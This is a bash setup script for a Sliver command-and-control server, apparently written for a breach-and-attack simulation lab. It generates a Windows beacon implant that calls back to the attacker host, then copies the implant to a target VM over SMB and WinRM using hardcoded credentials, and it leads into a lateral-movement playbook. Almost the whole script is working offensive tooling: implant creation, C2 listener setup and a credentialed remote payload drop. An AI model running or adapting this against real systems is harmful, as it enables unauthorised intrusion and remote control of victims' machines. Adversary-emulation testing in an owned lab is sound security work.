#!/bin/bash
# Sliver C2 Setup Script
# ======================
# Sets up Sliver C2 server, generates implant for Windows VM,
# and prepares everything for the lateral movement playbook.
#
# Usage: ./setup_sliver.sh
# Run this ONCE before using the Sliver lateral movement playbook.

set -e

ATTACKER_IP="${ATTACKER_IP:-192.168.56.101}"
TARGET_IP="${TARGET_IP:-192.168.56.102}"
TARGET_USER="${TARGET_USER:-akila}"
TARGET_PASS="${TARGET_PASS:-12345678}"
SLIVER_PORT="${SLIVER_PORT:-31337}"
HTTP_PORT="${HTTP_PORT:-8443}"
IMPLANT_DIR="./sliver_implants"
CONFIG_DIR="./sliver_config"

GREEN='\033[0;32m'; YELLOW='\033[1;33m'; RED='\033[0;31m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

log_info()    { echo -e "${BLUE}[INFO]${NC} $1"; }
log_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }
log_warning() { echo -e "${YELLOW}[WARNING]${NC} $1"; }
log_error()   { echo -e "${RED}[ERROR]${NC} $1"; }
log_step()    { echo -e "\n${BOLD}${CYAN}━━━ STEP: $1 ━━━${NC}"; }

mkdir -p "$IMPLANT_DIR" "$CONFIG_DIR"

# ─── Step 1: Check Sliver server ───────────────────────────────────────────────
log_step "1 — Check Sliver Server"

if ! which sliver-server &>/dev/null; then
    log_error "sliver-server not found. Install from: https://github.com/BishopFox/sliver/releases"
    exit 1
fi
log_success "sliver-server found: $(which sliver-server)"

# ─── Step 2: Start Sliver server (daemon) ──────────────────────────────────────
log_step "2 — Start Sliver Server"

if pgrep -x "sliver-server" > /dev/null 2>&1; then
    log_warning "Sliver server already running (PID: $(pgrep -x sliver-server))"
else
    log_info "Starting Sliver server as daemon..."
    sliver-server daemon --lhost 0.0.0.0 --lport "$SLIVER_PORT" &
    SLIVER_PID=$!
    sleep 5
    if kill -0 "$SLIVER_PID" 2>/dev/null; then
        log_success "Sliver server started (PID: $SLIVER_PID)"
        echo "$SLIVER_PID" > "$CONFIG_DIR/sliver_server.pid"
    else
        log_error "Sliver server failed to start"
        exit 1
    fi
fi

# ─── Step 3: Generate operator config ──────────────────────────────────────────
log_step "3 — Generate Operator Config"

CONFIG_FILE="$CONFIG_DIR/bas_operator.cfg"
if [ -f "$CONFIG_FILE" ]; then
    log_warning "Config already exists: $CONFIG_FILE"
else
    log_info "Generating operator config..."
    sliver-server operator --name bas_operator --lhost "$ATTACKER_IP" --save "$CONFIG_FILE" 2>/dev/null || true
    if [ -f "$CONFIG_FILE" ]; then
        log_success "Config saved: $CONFIG_FILE"
    else
        # Try alternative: use existing configs
        ls "$CONFIG_DIR"/*.cfg 2>/dev/null && CONFIG_FILE=$(ls "$CONFIG_DIR"/*.cfg | head -1) || true
        log_warning "Using config: $CONFIG_FILE"
    fi
fi

# Import config into sliver-client
if [ -f "$CONFIG_FILE" ]; then
    sliver import "$CONFIG_FILE" 2>/dev/null || true
    log_success "Config imported into sliver-client"
fi

# ─── Step 4: Start HTTP listener ───────────────────────────────────────────────
log_step "4 — Start HTTP Listener"

log_info "Starting HTTP listener on port $HTTP_PORT..."
# Use sliver-server grpc to run commands
cat > "$CONFIG_DIR/start_listener.txt" << EOF
http --lhost 0.0.0.0 --lport $HTTP_PORT
EOF
log_info "Listener config saved. Will be started when generating implant."

# ─── Step 5: Generate Windows implant ──────────────────────────────────────────
log_step "5 — Generate Windows Implant"

IMPLANT_NAME="bas_agent"
IMPLANT_FILE="$IMPLANT_DIR/${IMPLANT_NAME}.exe"

if [ -f "$IMPLANT_FILE" ]; then
    log_warning "Implant already exists: $IMPLANT_FILE"
    log_info "Delete it and re-run to regenerate"
else
    log_info "Generating Windows implant (HTTP beacon)..."
    log_info "  C2 URL: http://${ATTACKER_IP}:${HTTP_PORT}"
    log_info "  Beacon interval: 30s"
    log_info "  Output: $IMPLANT_FILE"

    # Generate via sliver-server generate command
    sliver-server generate \
        --http "${ATTACKER_IP}:${HTTP_PORT}" \
        --os windows \
        --arch amd64 \
        --format exe \
        --name "$IMPLANT_NAME" \
        --beacon \
        --beacon-interval 30s \
        --beacon-jitter 5s \
        --save "$IMPLANT_DIR/" 2>/dev/null || {
        log_warning "Direct generate failed, trying via batch..."
        # Alternative: write commands to a file for manual execution
        cat > "$CONFIG_DIR/generate_implant.sh" << GENEOF
#!/bin/bash
# Run this inside sliver-server console:
# sliver-server
# Then paste:
echo "http --lhost 0.0.0.0 --lport ${HTTP_PORT}" > /tmp/sliver_cmds.txt
echo "generate --http ${ATTACKER_IP}:${HTTP_PORT} --os windows --arch amd64 --format exe --name ${IMPLANT_NAME} --beacon --beacon-interval 30s --save ${IMPLANT_DIR}/" >> /tmp/sliver_cmds.txt
echo "Implant commands saved to /tmp/sliver_cmds.txt"
GENEOF
        chmod +x "$CONFIG_DIR/generate_implant.sh"
        log_warning "Manual generation needed. See: $CONFIG_DIR/generate_implant.sh"
    }
fi

# Check if implant was generated
if ls "$IMPLANT_DIR"/*.exe 2>/dev/null | head -1; then
    IMPLANT_FILE=$(ls "$IMPLANT_DIR"/*.exe | head -1)
    log_success "Implant found: $IMPLANT_FILE"
else
    log_warning "No .exe implant found yet. Run generate_implant.sh manually."
fi

# ─── Step 6: Transfer implant to Windows VM ────────────────────────────────────
log_step "6 — Transfer Implant to Windows VM"

if ls "$IMPLANT_DIR"/*.exe 2>/dev/null | head -1; then
    IMPLANT_FILE=$(ls "$IMPLANT_DIR"/*.exe | head -1)
    log_info "Transferring implant to Windows VM..."
    log_info "  From: $IMPLANT_FILE"
    log_info "  To:   \\\\${TARGET_IP}\\C\$\\Users\\${TARGET_USER}\\Desktop\\"

    # Transfer via SMB/WinRM
    if which smbclient &>/dev/null; then
        smbclient "//${TARGET_IP}/C\$" -U "${TARGET_USER}%${TARGET_PASS}" \
            -c "put \"$IMPLANT_FILE\" \"Users\\${TARGET_USER}\\Desktop\\${IMPLANT_NAME}.exe\"" 2>/dev/null && \
            log_success "Implant transferred via SMB" || \
            log_warning "SMB transfer failed, trying curl..."
    fi

    # Alternative: via WinRM Python
    python3 - << PYEOF
import winrm, os, base64
try:
    s = winrm.Session('http://${TARGET_IP}:5985/wsman', auth=('${TARGET_USER}', '${TARGET_PASS}'), transport='ntlm')
    with open('${IMPLANT_FILE}', 'rb') as f:
        data = base64.b64encode(f.read()).decode()
    # Write in chunks
    chunk_size = 8000
    chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
    print(f"[*] Transferring {len(chunks)} chunks...")
    # First chunk
    r = s.run_ps(f'\$b64 = "{chunks[0]}"')
    for i, chunk in enumerate(chunks[1:], 1):
        r = s.run_ps(f'\$b64 += "{chunk}"')
        if i % 10 == 0: print(f"  Chunk {i}/{len(chunks)}")
    r = s.run_ps(r'''
\$bytes = [Convert]::FromBase64String(\$b64)
\$path = "C:\Users\${TARGET_USER}\Desktop\${IMPLANT_NAME}.exe"
[IO.File]::WriteAllBytes(\$path, \$bytes)
Write-Host "[+] Implant written to \$path"
Test-Path \$path
''')
    print(r.std_out.decode())
except Exception as e:
    print(f"[-] Transfer failed: {e}")
PYEOF
else
    log_warning "No implant to transfer. Generate it first."
fi

# ─── Step 7: Save environment for playbook ─────────────────────────────────────
log_step "7 — Save Environment"

cat > "$CONFIG_DIR/sliver_env.sh" << EOF
#!/bin/bash
# Sliver C2 environment variables
export SLIVER_SERVER="${ATTACKER_IP}:${SLIVER_PORT}"
export SLIVER_HTTP_PORT="${HTTP_PORT}"
export SLIVER_IMPLANT_NAME="${IMPLANT_NAME}"
export SLIVER_TARGET_IP="${TARGET_IP}"
export SLIVER_TARGET_USER="${TARGET_USER}"
export SLIVER_IMPLANT_FILE="${IMPLANT_DIR}/${IMPLANT_NAME}.exe"
EOF
log_success "Environment saved to $CONFIG_DIR/sliver_env.sh"

echo ""
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║              SLIVER C2 SETUP COMPLETE                        ║"
echo "╠══════════════════════════════════════════════════════════════╣"
echo "║  Server:   ${ATTACKER_IP}:${SLIVER_PORT}                            ║"
echo "║  Listener: http://${ATTACKER_IP}:${HTTP_PORT}                       ║"
echo "║  Implant:  ${IMPLANT_DIR}/${IMPLANT_NAME}.exe          ║"
echo "╠══════════════════════════════════════════════════════════════╣"
echo "║  NEXT STEPS:                                                  ║"
echo "║  1. Execute implant on Windows VM                             ║"
echo "║  2. Run: ./playbooks/lateral_movement_sliver.sh               ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""
